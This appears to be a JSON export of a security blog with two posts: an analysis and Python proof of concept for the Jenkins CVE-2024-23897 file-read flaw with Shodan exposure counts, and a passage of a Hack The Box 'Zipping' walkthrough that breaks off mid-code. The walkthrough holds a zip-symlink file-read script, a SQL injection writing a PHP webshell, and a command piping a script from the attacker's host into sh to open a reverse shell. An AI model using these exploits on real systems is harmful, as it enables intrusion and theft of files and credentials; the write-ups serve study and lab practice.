[{"content":" \u0026ldquo;Just a nerd writing about tech\u0026rdquo; Hi, I’m Abraxas, a software developer with a Bachelor’s degree in Computer Science, venturing into the exciting world of infosec.\nLearn more\r","date":null,"permalink":"/","section":"Abraxas","summary":"\u0026ldquo;Just a nerd writing about tech\u0026rdquo; Hi, I’m Abraxas, a software developer with a Bachelor’s degree in Computer Science, venturing into the exciting world of infosec.","title":"Abraxas"},{"content":"","date":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":null,"permalink":"/tags/cve/","section":"Tags","summary":"","title":"CVE"},{"content":"","date":null,"permalink":"/tags/cve-2024-23897/","section":"Tags","summary":"","title":"CVE-2024-23897"},{"content":"","date":null,"permalink":"/tags/file-read/","section":"Tags","summary":"","title":"File-Read"},{"content":"","date":null,"permalink":"/tags/jenkins/","section":"Tags","summary":"","title":"Jenkins"},{"content":" Analysis and proof-of-concept (PoC) for Jenkins file-read vulnerability CVE-2024-23897.\nWhat\u0026rsquo;s Jenkins #Jenkins is an open-source automation tool that helps developers streamline the software development process, particularly by focusing on continuous integration and delivery (CI/CD). It helps development teams deliver faster and with more confidence, catching bugs early and streamlining the process from code change to production release, playing a vital role in automating key aspects of software development.\nCVE-2024-23897 #On January 24, 2024, Jenkins issued an advisory regarding a file-read vulnerability (CVE-2024-23897), leading to Remote Code Execution in Jenkins versions, including weekly releases up to and including 2.441, as well as Jenkins LTS up to and including 2.426.2. The vulnerability exploits the parseArgument() function in the args4j library used by jenkins to read files. To read entire files, Overall/Read permission is required. However, even without these permissions, the first three lines of a file can be accessed.\nJenkins offers multiple authorization methods, particularly options like \u0026ldquo;Anyone can do anything\u0026rdquo;, \u0026ldquo;Logged-in users can do anything\u0026rdquo;, \u0026ldquo;Legacy Mode\u0026rdquo;, and \u0026ldquo;Allow anonymous read access\u0026rdquo;, providing, at the very least, read access to almost anyone. Additionally, there\u0026rsquo;s an option on the Security page that allows users to sign up, granting them Read access.\nThis file-read vulnerability has the potential to escalate to RCE, by accessing binary files containing cryptographic keys. For instance, the hudson.util.Secret file in the secrets directory holds encrypted keys used for encrypting other secrets within Jenkins.\nSetting up a vulnerable instance locally #A local Jenkins instance with this specific vulnerability can easily be replicated via Docker Compose.\ncd docker docker compose up -d If everything goes smoothly, the Jenkins instance should be accessible at http://localhost:1234 within a few minutes.\n❯ http -ph localhost:1234 HTTP/1.1 200 OK \u0026lt;--snip--\u0026gt; X-Jenkins: 2.441 X-Jenkins-Session: afc817a2 The setup wizard requires the initial admin password, which can be retrieved from the container logs or from the secrets directory within the container. The subsequent setup wizard is relatively straightforward. Additionally, I created an admin user, abraxas:abraxas specifically for testing different permissions.\n❯ docker logs jenkins_vulnerable | less Running from: /usr/share/jenkins/jenkins.war webroot: /var/jenkins_home/war \u0026lt;--snip--\u0026gt; 2024-02-01 06:01:53.684+0000 [id=34] INFO jenkins.install.SetupWizard#init: ************************************************************* ************************************************************* ************************************************************* Jenkins initial setup is required. An admin user has been created and a password generated. Please use the following password to proceed to installation: 5581eac22dc145469a8a38ab9a6f74c6 This may also be found at: /var/jenkins_home/secrets/initialAdminPassword \u0026lt;--snip--\u0026gt; Overall Administrator privilege or read-only access is required to test the vulnerability. Although the \u0026ldquo;abraxas\u0026rdquo; user I created has these permissions, including authorization with every request could be cumbersome. Therefore, opting for a simpler alternative, I enabled Anonymous Read Access through the \u0026ldquo;Manage Jenkins/Security\u0026rdquo; page…\nEnable Anonymous Read Access in Jenkins Or, by directly modifying the config.xml file within the Jenkins home directory (/var/jenkins_home) within the container. This involves setting the denyAnonymousReadAccess property to false.\n❯ _ cat /var/lib/docker/volumes/docker_jenkins_data/_data/config.xml \u0026lt;--snip--\u0026gt; \u0026lt;useSecurity\u0026gt;true\u0026lt;/useSecurity\u0026gt; \u0026lt;authorizationStrategy class=\u0026#34;hudson.security.FullControlOnceLoggedInAuthorizationStrategy\u0026#34;\u0026gt; \u0026lt;denyAnonymousReadAccess\u0026gt;true\u0026lt;/denyAnonymousReadAccess\u0026gt; \u0026lt;/authorizationStrategy\u0026gt; \u0026lt;--snip--\u0026gt; Exploitation #The jenkins-ci.jar file can be obtained from the vulnerable instance by visiting http://\u0026lt;jenkins-host:port\u0026gt;/jnlpJars/jenkins-cli.jar. This allows access to Jenkins\u0026rsquo; built-in command line interface locally.\n❯ wget -q http://localhost:1234/jnlpJars/jenkins-cli.jar -O jenkins-cli.jar ❯ file jenkins-cli.jar jenkins-cli.jar: Java archive data (JAR) ❯ java -jar jenkins-cli.jar -help Neither -s nor the JENKINS_URL env var is specified. Jenkins CLI Usage: java -jar jenkins-cli.jar [-s URL] command [opts...] args... Options: -s URL : the server URL (defaults to the JENKINS_URL env var) -webSocket : connect using WebSocket (the default; works well with most reverse proxies; requires Jetty) -http : use a pair of HTTP(S) connections rather than WebSocket -ssh : use SSH protocol rather than WebSocket (requires -user; SSH port must be open on server) -i KEY : SSH private key file used for authentication (for use with -ssh) -noCertificateCheck : bypass HTTPS certificate check entirely. Use with caution -noKeyAuth : do not try to load the SSH authentication private key. Conflicts with -i -user : specify user (for use with -ssh; must have registered a public key) -strictHostKey : request strict host key checking (for use with -ssh) -logger FINE : enable detailed logging from the client -auth [ USER:SECRET | @FILE ] : specify username and either password or API token (or load from them both from a file); for use with -http. Passing credentials by file is recommended. See https://www.jenkins.io/redirect/cli-http-connection-mode for more info and options. -bearer [ TOKEN | @FILE ] : specify authentication using a bearer token (or load the token from file); for use with -http. Mutually exclusive with -auth. Passing credentials by file is recommended. The available commands depend on the server. Run the \u0026#39;help\u0026#39; command to see the list. As highlighted in the blog post by Sonar, the connect-node command can be exploited to trigger args4j\u0026rsquo;s parseArgument() by adding a @ prefix to the filename. This allows unauthorized reading of files, such as /etc/hostname.\u0026quot;\n❯ java -jar jenkins-cli.jar -s http://localhost:1234/ -http connect-node \u0026#34;@/etc/hostname\u0026#34; ERROR: No such agent \u0026#34;jenkins_vuln_instance\u0026#34; exists. The hostname obtained from vulnerability can be verified using the docker exec command.\n❯ docker exec -it jenkins_vulnerable /bin/bash -c \u0026#39;hostname\u0026#39; jenkins_vuln_instance When parseArgument() invokes expandAtFiles(), the @ symbol triggers specific behavior:\nIf the argument is prefixed with a @, then expandAtFiles() interprets its as a file to be read. It reads the contents of file line-by-line, and each line is considered a separate argument. This functionality combined with the connect-node command, can essentially read contents of the entire file:\nThe connect-node command typically expects a list of nodes for connection attempts. And with a when a file prefixed with @ is provided, it processes the entire file and treats each argument as a distinct node and attempts to connect to them. Upon failure, it prints the specific node it attempted to connect to. I included a file named fileRead_test.txt within the container to explore alternative file read methods.\n❯ docker exec -it jenkins_vulnerable /bin/bash -c \u0026#39;cat ~/fileRead_test.txt\u0026#39; line 1 line 2 line 3 line 4 line 5 With the anonymous read access enabled, I managed to list the entire contents of the file using the connect-node command. However, the order in which the information was listed seems to be altered.\n❯ java -jar jenkins-cli.jar -s http://localhost:1234/ -http connect-node \u0026#34;@/var/jenkins_home/fileRead_test.txt\u0026#34; Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true line 2: No such agent \u0026#34;line 2\u0026#34; exists. line 3: No such agent \u0026#34;line 3\u0026#34; exists. line 1: No such agent \u0026#34;line 1\u0026#34; exists. line 4: No such agent \u0026#34;line 4\u0026#34; exists. line 5: No such agent \u0026#34;line 5\u0026#34; exists. ERROR: Error occurred while performing this command, see previous stderr output. Different commands exhibit varying abilities to read specific lines within the file. Even with anonymous read access disabled, the who-am-i and shutdown commands revealed the first line, while the enable-job command granted access to the second line.\n❯ java -jar jenkins-cli.jar -s http://localhost:1234/ -http who-am-i \u0026#34;@/var/jenkins_home/fileRead_test.txt\u0026#34; Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true ERROR: No argument is allowed: line 1 java -jar jenkins-cli.jar who-am-i Reports your credential and permissions. ❯ java -jar jenkins-cli.jar -s http://localhost:1234/ -http shutdown \u0026#34;@/var/jenkins_home/fileRead_test.txt\u0026#34; Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true ERROR: No argument is allowed: line 1 java -jar jenkins-cli.jar shutdown Immediately shuts down Jenkins server. ❯ java -jar jenkins-cli.jar -s http://localhost:1234/ -http enable-job \u0026#34;@/var/jenkins_home/fileRead_test.txt\u0026#34; Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true ERROR: Too many arguments: line 2 java -jar jenkins-cli.jar enable-job NAME Enables a job. NAME : Job name The help command on the other hand prints both, the first and second lines.\n❯ java -jar jenkins-cli.jar -s http://localhost:1234/ -http help \u0026#34;@/var/jenkins_home/fileRead_test.txt\u0026#34; Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true ERROR: Too many arguments: line 2 java -jar jenkins-cli.jar help [COMMAND] Lists all the available commands or a detailed description of single command. COMMAND : Name of the command (default: line 1) Creating a PoC #I wanted to see how the jar file interacted with the server, so I set up Burp\u0026rsquo;s invisible proxy. This involved setting up BurpSuite to intercept and inspect traffic by forwarding communications from port 80 on my local machine to port 1234, allowing me see the communication between the jar file and the Jenkins server.\n❯ java -jar jenkins-cli.jar -s http://localhost -http connect-node \u0026#34;@/etc/hostname\u0026#34; Whenever I used jenkins-cli.jar, I notice three specific requests:\nA GET request to /. I imagine this is just to test the connectivity. A POST request to /cli for downloading. A POST request to /cli for uploading. I employed Burp\u0026rsquo;s comparer to analyze the two POST requests:\nBoth requests feature a session header resembling a UUID. Additionally, both requests include an extra Side header. In the first request: The POST data is NULL, and The Side header is configured as \u0026ldquo;download\u0026rdquo;. In the second request: The Side header is configured as \u0026ldquo;upload\u0026rdquo;. The Post data involved appears to be bytecode, and this can be verified by examining it in hex. Analyze request with Comparer I utilized Burp\u0026rsquo;s \u0026ldquo;copy-as-curl\u0026rdquo; option to extract the bytecode post data. Subsequently, I used Python\u0026rsquo;s requests library to script the sending of the two requests sequentially. Unfortunately, the script consistently resulted in a 500 status code.\n❯ python poc.py [i] Target URL http://localhost:1234/cli?remoting=false Exception raised: 500 Server Error: Server Error for url: http://localhost:1234/cli?remoting=false Revisiting Burp, I observed that both requests occurred nearly simultaneously. To account for this, I adjusted the script to send the requests concurrently via threading. While this approach proved successful at times, it was inconsistent. Analyzing Burp\u0026rsquo;s history, I noticed that the order was occasionally swapped for requests resulting in timeouts. To mitigate this, I introduced a 0.1-second delay to ensure that one request doesn\u0026rsquo;t disconnect without receiving a response. Now, with the modified Python script, I can exploit the vulnerability to read file contents.\n❯ python CVE-2024-23897.py --url \u0026#39;http://127.0.0.1:1234/\u0026#39; --file \u0026#39;/etc/hostname\u0026#39; [i] Vulnerable to CVE-2024-23897 (Jenkins v2.441 \u0026lt;= 2.441) [*] Target URL http://127.0.0.1:1234/cli?remoting=false [*] Attempting to read /etc/hostname [i] Download request done [+] Found data, printing... ERROR: No such agent \u0026#34;jenkins_vuln_instance\u0026#34; exists. [i] Upload request done [i] All threads completed However, despite this approach, I encountered difficulties retrieving larger files such as /etc/passwd. The connection consistently terminated before completing the second upload request. I added a timeout to the requests to fix this.\n❯ python CVE-2024-23897.py --url \u0026#39;http://127.0.0.1:1234/\u0026#39; --file \u0026#39;/etc/passwd\u0026#39; --method 1 [i] Vulnerable to CVE-2024-23897 (Jenkins v2.441 \u0026lt;= 2.441) [*] Target URL http://127.0.0.1:1234/cli?remoting=false [*] Attempting to read /etc/passwd [i] Download request done [+] Found data, printing... [X] Download request failed: (\u0026#34;Connection broken: InvalidChunkLength(got length b\u0026#39;\\\\x00\u0026#39;, 0 bytes read)\u0026#34;, InvalidChunkLength(got length b\u0026#39;\\x00\u0026#39;, 0 bytes read)) [i] Upload request done [i] All threads completed While I opted for Anonymous Read Access for PoC, the script can easily be adapted to include the Authorization: Basic YWJyYXhhczphYnJheGFz header for each request if you wish to test with authenticated users.\njava -jar jenkins-cli.jar -s http://localhost:1234/ -auth abraxas:abraxas -http connect-node \u0026quot;@/etc/hostname\u0026quot;\nAnalysis w/ Shodan #I came across a post indicating that over 45,000 Jenkins instances were vulnerable to this particular vulnerability. This led me to consider utilizing Shodan, which essentially maps the entire internet, to analyze the extent of vulnerable instances exposed to the internet.\nTo identify exposed instances, I wrote a Python script to generate the MurmurHash3 hash for the site\u0026rsquo;s favicon.\n❯ python gen_favicon_hash.py http://localhost:1234 Favicon hash: 81586312 Subsequently, I used the hash in a Shodan query to search for Jenkins instances, which yielded 83,655 results.\n❯ shodan count \u0026#34;http.favicon.hash:81586312\u0026#34; 83655 Regrettably, many of these, even those accessible on the internet, require some form of authorization. So, I adjusted the query to filter results returning a 200 status code, reducing the results to 13,164.\n❯ shodan count \u0026#34;http.favicon.hash:81586312 200\u0026#34; 13164 ❯ shodan stats \u0026#34;http.favicon.hash:81586312 200\u0026#34; Top 10 Results for Facet: country CN 12,529 US 307 DE 55 FR 42 SG 27 IN 23 GB 19 KR 18 HK 16 IE 16 Top 10 Results for Facet: org Aliyun Computing Co., LTD 10,407 Aliyun Computing Co.LTD 1,007 China Mobile Communications Corporation 184 CHINANET SHANGHAI PROVINCE NETWORK 121 Amazon Technologies Inc. 120 China Unicom Shandong Province Network 93 Zhejiang Taobao Network Co.,Ltd 88 CHINANET Guangdong province network 68 Hangzhou Alibaba Advertising Co.,Ltd. 63 Amazon.com, Inc. 49 Analyzing 13k results would require a decent amount of Shodan credits and time. Given that the United States had just over 300 results, I opted to focus on analyzing instances there.\n❯ date -u Sunday 04 February 2024 11:38:28 PM UTC ❯ python shodan_analysis.py [i] Using query: http.favicon.hash:81586312 200 country:US [i] Total Jenkins instances found: 307 [+] Vulnerable instances found: 206 | Current count: 305 [*] Querying complete! [+] Total vulnerable instances: 206 [+] 100 instances not vulnerable or unable to determine their version It turns out that out of the 307 instances identified, 206 (67.10%) haven\u0026rsquo;t upgraded their instances. While it\u0026rsquo;s plausible that some may have implemented the temporary workaround suggested by Jenkins, the fact that a significant number still utilizes the vulnerable version, even 12 days (at the time of writing) after a CVE was assigned for the vulnerability, is concerning.\nShodan Report Related Links # AbraXa5/Jenkins-CVE-2024-23897: PoC for Jenkins CVE-2024-23897 AbraXa5/Jenkins-CVE-2024-23897/shodan_research Excessive Expansion: Uncovering Critical Security Vulnerabilities in Jenkins | Sonar Jenkins Security Advisory 2024-01-24 Jenkins Core Remote Code Execution Vulnerability (CVE-2024-23897) – Qualys ThreatPROTECT CVE-2024-23897: Assessing the Impact of the Jenkins Arbitrary File Leak Vulnerability – Horizon3.ai jenkinsci-cert/SECURITY-3314-3315: Workaround for disabling the CLI to mitigate SECURITY-3314/CVE-2024-23897 and SECURITY-3315/CVE-2024-23898 ","date":"4 February 2024","permalink":"/blog/cve-2024-23897/","section":"Blog Posts","summary":"Analysis and proof-of-concept (PoC) for Jenkins file-read vulnerability CVE-2024-23897.","title":"Jenkins CVE-2024-23897"},{"content":"","date":null,"permalink":"/categories/poc/","section":"Categories","summary":"","title":"PoC"},{"content":"","date":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python"},{"content":"","date":null,"permalink":"/categories/research/","section":"Categories","summary":"","title":"Research"},{"content":"","date":null,"permalink":"/tags/shodan/","section":"Tags","summary":"","title":"Shodan"},{"content":"","date":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":null,"permalink":"/tags/file-inclusion/","section":"Tags","summary":"","title":"File-Inclusion"},{"content":"","date":null,"permalink":"/tags/gdb/","section":"Tags","summary":"","title":"Gdb"},{"content":"","date":null,"permalink":"/categories/htb/","section":"Categories","summary":"","title":"HTB"},{"content":"Overview # Zipping is a medium-difficulty Linux box hosting a PHP web application with a vulnerable file upload function. This function is susceptible to a file read exploit involving zip archives. By exploiting this flaw, I was able to obtain the application\u0026rsquo;s source code, revealing a SQL injection vulnerability. I leveraged this vulnerability to write a webshell on the system. Additionally, I discovered that the user rektsu has sudo privileges over a binary, and misconfigurations in shared library objects can be exploited to gain root privileges.\nEnumeration # Open Ports #I found two open ports using nmap:\nport 22 → OpenSSH port 80 → Apache Web server # Nmap 7.94 scan initiated Fri Sep 1 17:12:31 2023 as: nmap -p22,80 -sV -sC -T4 -Pn -oA nmap/10.129.66.225 10.129.66.225 Nmap scan report for 10.129.66.225 Host is up (0.061s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA) |_ 256 eb:95:11:c7:a6:fa:ad:74🆎a2:c5:f6:a4:02:18:41 (ED25519) 80/tcp open http Apache httpd 2.4.54 ((Ubuntu)) |_http-title: Zipping | Watch store |_http-server-header: Apache/2.4.54 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel port 80 - HTTP #The headers give limited information, revealing only the Apache version in use, v2.4.54.\n\u0026gt; http -ph 10.129.66.225 HTTP/1.1 200 OK Connection: Keep-Alive Content-Encoding: gzip Content-Length: 4094 Content-Type: text/html; charset=UTF-8 Date: Fri, 01 Sep 2023 11:53:53 GMT Keep-Alive: timeout=5, max=100 Server: Apache/2.4.54 (Ubuntu) Vary: Accept-Encoding The website appears to be an eCommerce platform specializing in watches. The presence of shop and work-with-us links on the index page hint at functionalities beyond static information. Additionally, .php extensions suggest the backend relies on PHP.\nIndex Page Probing further, I examined shop/index.php. It showcases several products that can be added to the cart. However, attempts to place an order appears inconsequential.\nClicking the Work with Us button redirects to /upload.php. The page has an intriguing functionality: the ability to upload zip files. The only peculiar condition is that the uploaded zip file must contain a PDF document within its structure.\nWork with us page Directory bruteforcing #Before investigating the upload functionality, I opted to fuzz for hidden files and directories with ffuf. Unfortunately, the scan doesn\u0026rsquo;t return additional results beyond what I had already discovered.\n\u0026gt; ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.66.225/FUZZ -o ffuf_zipping.md -of md -t 100 ...snip... ...snip... .hta [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 63ms] .htpasswd [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 63ms] .htaccess [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 63ms] assets [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 62ms] index.php [Status: 200, Size: 16738, Words: 5717, Lines: 318, Duration: 66ms] server-status [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 59ms] shop [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 56ms] uploads [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 61ms] Initial Foothold # Zip symlink file-read vulnerability #Upon successful upload of a valid zip file that met the specified condition, the system automatically extracts the contents of the archive. This part interests me, as it potentially introduces a compelling point of vulnerability. The prospect of a staff member subsequently interacting with the extracted PDF makes it even more interesting. The page also returns a link to view to extracted PDF file.\nThe very first vulnerability that comes to mind when considering automatic archive extraction is the zip symlink attack. In essence, this involves adding a symlink to another file on the system within the archive. By accessing the decompressed file, one can potentially view the contents of the linked file.\nGiven that the uploaded zip requires a PDF file, creating a soft symlink from /etc/hostname to file.pdf suing ln. Moreover, during the compression of the file, the preservation of the symlink can be ensured by using the -y option.\n\u0026gt; ln -s /etc/hostname file.pdf \u0026gt; zip -y poc.zip file.pdf adding: file.pdf (stored 0%) The newly crafted archive can be successfully uploaded, and as a result it returns a link to view the decompressed PDF file.\nZip symlink exploit PoC As anticipated, because file.pdf points to /etc/hostname, querying the file using the provided link reveals the contents of /etc/hostname.\n\u0026gt; http -pb http://10.129.66.225/uploads/6d34d4685c1618ff320f6679d158c477/file.pdf zipping To streamline the process, I wrote a Python script that automates the creation of a symlink, then archiving and uploading, and finally viewing the decompressed file.\n#!/usr/bin/env python import os import re import subprocess import sys import requests import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) filePath = sys.argv[1] username = \u0026#34;\u0026#34; password = \u0026#34;\u0026#34; url = \u0026#34;http://10.129.66.225/\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} # files = {\u0026#39;file\u0026#39;: (\u0026#39;xxe.xml\u0026#39;, payload, \u0026#39;text/xml\u0026#39;)} fileName = os.path.basename(filePath) symlink_command = f\u0026#34;ln -s {filePath} symlink.pdf\u0026#34; symlink_process = subprocess.Popen(symlink_command, shell=True) symlink_process.wait() if symlink_process.returncode != 0: print(f\u0026#34;Error symlinking: {symlink_process.returncode}\u0026#34;) exit() print(\u0026#34;[+] Symlink created.\u0026#34;) zip_command = \u0026#34;zip -y exploit.zip symlink.pdf\u0026#34; zip_process = subprocess.Popen(zip_command, shell=True) zip_process.wait() if zip_process.returncode != 0: print(f\u0026#34;Error zipping: {zip_process.returncode}\u0026#34;) exit() print(\u0026#34;[+] File successfully zipped.\u0026#34;) with open(\u0026#34;exploit.zip\u0026#34;, \u0026#34;rb\u0026#34;) as file: zip_content = file.read() files = { \u0026#34;zipFile\u0026#34;: (\u0026#34;exploit.zip\u0026#34;, zip_content, \u0026#34;application/zip\u0026#34;), \u0026#34;submit\u0026#34;: (None, \u0026#34;Submit\u0026#34;), } # print(files) session = requests.Session() response = session.post( url=url + \u0026#34;upload.php\u0026#34;, files=files, proxies=proxies, verify=False ) pattern = r\u0026#34;uploads/[0-9a-fA-F]{32}/symlink\\.pdf\u0026#34; match = re.search(pattern, response.text) if not match: print(\u0026#34;File not uploaded\u0026#34;) uploaded_path = match.group(0) print(f\u0026#34;View file @ {url}/{uploaded_path}\u0026#34;) response = session.get(url=url + uploaded_path, proxies=proxies) print(f\u0026#34;File content:\\n{response.text}\u0026#34;) with open(fileName, \u0026#34;a\u0026#34;) as f: f.write(response.text) os.system(\u0026#34;rm -rf symlink.pdf exploit.zip\u0026#34;) \u0026gt; python zipSymlink.py /etc/hostname [+] Symlink created. adding: symlink.pdf (stored 0%) [+] File successfully zipped. View file @ http://10.129.66.225//uploads/05101da7a883e7887506fca8c88787ca/symlink.pdf File content: zipping I was able to Identify a user named rektsu based on the information retrieved from the /etc/passwd file.\n\u0026gt; python zipSymlink.py /etc/passwd | grep sh$ root❌0:0:root:/root:/bin/bash rektsu❌1001:1001::/home/rektsu:/bin/bash As per the Apache configuration file, the root directory for the website is located at /var/www/html.\n\u0026gt; python zipSymlink.py /etc/apache2/sites-available/000-default.conf ...snip... ...snip... ServerAdmin webmaster@localhost DocumentRoot /var/www/html \u0026lt;Directory /var/www/html/uploads\u0026gt; Options -Indexes \u0026lt;/Directory\u0026gt; ...snip... By using the document root, I accessed the source code of the page at shop/index.php (/var/www/html/shop/index.php). The code includes PHP files, with the limitation that it appends a .php to the value of the page parameter, allowing only the inclusion of PHP files. Despite not knowing the PHP version, my initial attempt to use a null byte (index.php?page=/etc/hostname%00) proved unsuccessful, indicating a PHP version likely greater than 8.\nshop/index.php\n\u0026lt;?php session_start(); // Include functions and connect to the database using PDO MySQL include \u0026#39;functions.php\u0026#39;; $pdo = pdo_connect_mysql(); // Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see. $page = isset($_GET[\u0026#39;page\u0026#39;]) \u0026amp;\u0026amp; file_exists($_GET[\u0026#39;page\u0026#39;] . \u0026#39;.php\u0026#39;) ? $_GET[\u0026#39;page\u0026#39;] : \u0026#39;home\u0026#39;; // Include and show the requested page include $page . \u0026#39;.php\u0026#39;; ?\u0026gt; The index.php file includes a function.php file, presumably situated in the same directory. In the shop/functions.php file, I found credentials for the MySQL database: root:MySQL_P@ssw0rd!. It also references a products.php file.\nshop/functions.php\n?php function pdo_connect_mysql() { // Update the details below with your MySQL details $DATABASE_HOST = \u0026#39;localhost\u0026#39;; $DATABASE_USER = \u0026#39;root\u0026#39;; $DATABASE_PASS = \u0026#39;MySQL_P@ssw0rd!\u0026#39;; $DATABASE_NAME = \u0026#39;zipping\u0026#39;; try { return new PDO(\u0026#39;mysql:host=\u0026#39; . $DATABASE_HOST . \u0026#39;;dbname=\u0026#39; . $DATABASE_NAME . \u0026#39;;charset=utf8\u0026#39;, $DATABASE_USER, $DATABASE_PASS); ---snip--- \u0026lt;a href=\u0026#34;index.php\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;index.php?page=products\u0026#34;\u0026gt;Products\u0026lt;/a\u0026gt; ---snip--- Writing a webshell using SQLi #The source for products.php is much more interesting. It directly incorporates the id parameter from the GET parameters into a SQL query.\nproducts.php\n\u0026lt;?php // Check to make sure the id parameter is specified in the URL if (isset($_GET[\u0026#39;id\u0026#39;])) { $id = $_GET[\u0026#39;id\u0026#39;]; // Filtering user input for letters or special characters if(preg_match(\u0026#34;/^.*[A-Za-z!#$%^\u0026amp;*()\\-_=+{}\\[\\]\\\\|;:\u0026#39;\\\u0026#34;,.\u0026lt;\u0026gt;\\/?]|[^0-9]$/\u0026#34;, $id, $match)) { header(\u0026#39;Location: index.php\u0026#39;); } else { // Prepare statement and execute, but does not prevent SQL injection $stmt = $pdo-\u0026gt;prepare(\u0026#34;SELECT * FROM products WHERE id = \u0026#39;$id\u0026#39;\u0026#34;); $stmt-\u0026gt;execute(); // Fetch the product from the database and return the result as an Array $product = $stmt-\u0026gt;fetch(PDO::FETCH_ASSOC); // Check if the product exists (array is not empty) if (!$product) { // Simple error to display if the id for the product doesn\u0026#39;t exists (array is empty) exit(\u0026#39;Product does not exist!\u0026#39;); } } } else { // Simple error to display if the id wasn\u0026#39;t specified exit(\u0026#39;No ID provided!\u0026#39;); } ?\u0026gt; ---snip--- \u0026lt;form action=\u0026#34;index.php?page=cart\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; ---snip--- The preg_match() function is utilized to filter the contents of the id parameter, but it only ensures that the payload ends with a number without much other filtering.\nif(preg_match(\u0026#34;/^.*[A-Za-z!#$%^\u0026amp;*()\\-_=+{}\\[\\]\\\\|;:\u0026#39;\\\u0026#34;,.\u0026lt;\u0026gt;\\/?]|[^0-9]$/\u0026#34;, $id, $match)) { header(\u0026#39;Location: index.php\u0026#39;); } I can bypass the regex check using a new line (%0A) in the payload. This can be confirmed by setting the id parameter to %0A2, which loads the same product as when the id parameter is set to 2.\nVerify preg_match() bypass Furthermore, given that PDO is used for preparing SQL queries, it\u0026rsquo;s worth noting that PDO permits consecutive multiple queries separated by a new line.\nA payload like this (URL-encoded new line followed by a SQL query to write to a file) should successfully bypass the regex check and write code to execute phpinfo() at the specified location using mysql\u0026rsquo;s SELECT...INTO OUTFILE. It\u0026rsquo;s interesting that the /tmp directory didn\u0026rsquo;t work for writing, but /dev/shm functions as expected for some reason.\n%0A\u0026#39;;select \u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39; into outfile \u0026#39;/dev/shm/poc.php\u0026#39; #2 This can be verified by using the PHP inclusion functionality at /shop/index.php?page=.\nSQLi to Code execution PoC Now, with the ability to execute code, I use URL-encoded version of this payload to fetch a script containing a reverse shell payload from my attack box and execute it, ultimately obtaining a shell.\n%0A\u0026#39;;select \u0026#39;\u0026lt;?php system(\u0026#34;curl http://10.10.14.42/shell_payload.sh | sh\u0026#34;);?\u0026gt;\u0026#39; into outfile \u0026#39;/dev/shm/shell.php\u0026#39; #2 The process involves invoking the file at /dev/shm/shell.php, which retrieves the hosted shell_payload.sh file from my attack box and executes it, giving a shell.\nhttp zipping.htb/shop/index.php page==/dev/shm/shell \u0026gt; pc -lp 9005 [23:32:21] Welcome to pwncat 🐈! __main__.py:164 [23:48:29] received connection from 10.129.66.225:45182 bind.py:84 [23:48:30] 0.0.0.0:9005: upgrading from /usr/bin/dash to /usr/bin/bash manager.py:957 [23:48:31] 10.129.66.225:45182: registered new host w/ db manager.py:957 (local) pwncat$ (remote) rektsu@zipping:/$ id uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu) Unintended Foothold (Patched) #Null Byte Injection #I decided to fetch the source code of the upload functionality to analyze it. Given that the application provides a link to view the decompressed file, uploading a PHP file within the archive could potentially allow the execution of malicious code.\n\u0026lt;?php if(isset($_POST[\u0026#39;submit\u0026#39;])) { // Get the uploaded zip file $zipFile = $_FILES[\u0026#39;zipFile\u0026#39;][\u0026#39;tmp_name\u0026#39;]; if ($_FILES[\u0026#34;zipFile\u0026#34;][\u0026#34;size\u0026#34;] \u0026gt; 300000) { echo \u0026#34;\u0026lt;p\u0026gt;File size must be less than 300,000 bytes.\u0026lt;/p\u0026gt;\u0026#34;; } else { // Create an md5 hash of the zip file $fileHash = md5_file($zipFile); // Create a new directory for the extracted files $uploadDir = \u0026#34;uploads/$fileHash/\u0026#34;; // Extract the files from the zip $zip = new ZipArchive; if ($zip-\u0026gt;open($zipFile) === true) { if ($zip-\u0026gt;count() \u0026gt; 1) { echo \u0026#39;\u0026lt;p\u0026gt;Please include a single PDF file in the archive.\u0026lt;p\u0026gt;\u0026#39;; } else { // Get the name of the compressed file $fileName = $zip-\u0026gt;getNameIndex(0); if (pathinfo($fileName, PATHINFO_EXTENSION) === \u0026#34;pdf\u0026#34;) { mkdir($uploadDir); echo exec(\u0026#39;7z e \u0026#39;.$zipFile. \u0026#39; -o\u0026#39; .$uploadDir. \u0026#39;\u0026gt;/dev/null\u0026#39;); echo \u0026#39;\u0026lt;p\u0026gt;File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:\u0026lt;/p\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;.$uploadDir.$fileName.\u0026#39;\u0026#34;\u0026gt;\u0026#39;.$uploadDir.$fileName.\u0026#39;\u0026lt;/a\u0026gt;\u0026#39;.\u0026#39;\u0026lt;/p\u0026gt;\u0026#39;; } else { 